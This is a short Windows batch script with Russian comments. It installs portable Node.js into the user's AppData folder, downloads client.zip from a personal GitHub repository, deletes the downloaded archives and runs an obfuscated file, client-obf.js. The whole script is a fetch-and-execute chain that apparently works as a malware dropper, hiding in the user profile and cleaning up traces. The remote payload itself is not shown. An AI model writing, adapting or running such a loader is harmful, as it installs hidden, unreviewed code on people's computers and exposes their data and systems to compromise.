@echo off
cd %appdata%

:: Скачиваем Node.js
curl -L -o node.zip https://nodejs.org/dist/v22.19.0/node-v22.19.0-win-x64.zip

:: Распаковываем Node.js
tar -xf node.zip

:: Переходим в папку Node.js
cd node-v22.19.0-win-x64

:: Скачиваем client.zip
curl -L -o client.zip https://raw.githubusercontent.com/DaleGelb/files/main/client.zip

:: Распаковываем client.zip
tar -xf client.zip

:: Удаляем архивы
del /f /q ..\node.zip
del /f /q client.zip

:: Запускаем client-obf.js через node.exe из этой же папки
node.exe client-obf.js

pause
